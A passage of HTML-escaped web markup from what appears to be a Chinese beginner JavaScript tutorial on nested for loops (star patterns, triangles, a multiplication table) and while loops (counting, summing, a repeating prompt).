&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {	&lt;span style=&#34;color:#75715e&#34;&gt;// 里层循环负责一行打印五个星星
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;★&amp;#39;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#75715e&#34;&gt;// 如果一行打印完毕5个星星就要另起一行加\n
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 打印n行n列的星星
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rows&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请你输入行数：&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cols&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请你输入列数：&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rows&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cols&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;★&amp;#39;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;733-打印倒三角形&#34;&gt;7.3.3 打印倒三角形&lt;/h3&gt;
&lt;p&gt;案例分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一共有10行，但是每行的星星个数不一样，因此需要用到双重for驯化怒&lt;/li&gt;
&lt;li&gt;外层的for控制行数i，循环10次可以打印10行&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 打印倒三角形案例
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) { 	&lt;span style=&#34;color:#75715e&#34;&gt;//	外层循环控制行数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {		&lt;span style=&#34;color:#75715e&#34;&gt;// 里层循环打印的个数不一样 j = i
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;★&amp;#39;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;打印正三角形&#34;&gt;打印正三角形&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 打印正三角形案例
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {		&lt;span style=&#34;color:#75715e&#34;&gt;// 外层循环控制行数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {	&lt;span style=&#34;color:#75715e&#34;&gt;// 里层循环打印的个数不一样 j &amp;lt;= i
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;★&amp;#39;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;734-打印九九乘法表&#34;&gt;7.3.4 打印九九乘法表&lt;/h3&gt;
&lt;p&gt;案例分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一共有9行，但是每行的个数不一样，因此需要用到双重for循环&lt;/li&gt;
&lt;li&gt;外层的for循环控制行数i，循环9次，可以打印9行&lt;/li&gt;
&lt;li&gt;内层的for循环控制每行公式j&lt;/li&gt;
&lt;li&gt;核心算法：每一行&lt;strong&gt;公式的个数&lt;/strong&gt;正好和&lt;strong&gt;行数&lt;/strong&gt;一致，j &amp;lt;= i;&lt;/li&gt;
&lt;li&gt;每行打印完毕，都需要重新换一行&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {		&lt;span style=&#34;color:#75715e&#34;&gt;// 外层循环控制行数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {	&lt;span style=&#34;color:#75715e&#34;&gt;// 里层循环控制每一行的个数 j &amp;lt;= i
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 1 * 2 = 2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// str = str + &amp;#39;★&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\t&amp;#39;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;735-for-循环小结&#34;&gt;7.3.5 for 循环小结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;for 循环可以重复执行某些相同代码&lt;/li&gt;
&lt;li&gt;for 循环可以重复执行些许不同的代码，因为我们有计数器&lt;/li&gt;
&lt;li&gt;for 循环可以重复执行某些操作，比如算数运算符加法操作&lt;/li&gt;
&lt;li&gt;随着需求增加，双重 for 循环可以做更多、更好看的效果&lt;/li&gt;
&lt;li&gt;双重 for 循环，外层循环一次，内层 for 循环全部执行&lt;/li&gt;
&lt;li&gt;for 循环是循环条件和数字直接相关的循环&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;74-while-循环&#34;&gt;7.4 while 循环&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. while 循环语法结构 while 当...的时候
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 循环体
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 执行思路，当条件表达式结果为true，则执行循环体，否则退出循环
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 代码验证
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;How are you&amp;#39;&lt;/span&gt;);
        &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 里面应该也有计数器，初始化变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 5. 里面应该也有操作表达式，完成计数器的更新，防止死循环
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;741-案例&#34;&gt;7.4.1 案例&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;打印人的一生，从1岁到100岁&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;计算 1~100 之间所有整数的和&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;弹出一个提示框，你爱我吗？如果输入我爱你，就提示结束，否则就一致询问。&lt;/p&gt;
&lt;p&gt;案例分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;弹出输入框，要求用户输入&lt;/li&gt;
&lt;li&gt;判断条件比较复杂我们使用while循环&lt;/li&gt;
&lt;li&gt;while循环语句中的条件表达式只要输入的不是我爱你，就一直循环&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// while循环案例
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 打印人的一生，从1岁到100岁
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;这个人今年&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;岁了&amp;#39;&lt;/span&gt;);
        &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 计算 1~100 之间所有整数的和
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 弹出一个提示框，你爱我吗？如果输入我爱你，就提示结束，否则就一致询问。
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;你爱我吗&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我爱你&amp;#39;&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;你爱我吗&amp;#39;&lt;/span&gt;);
    }
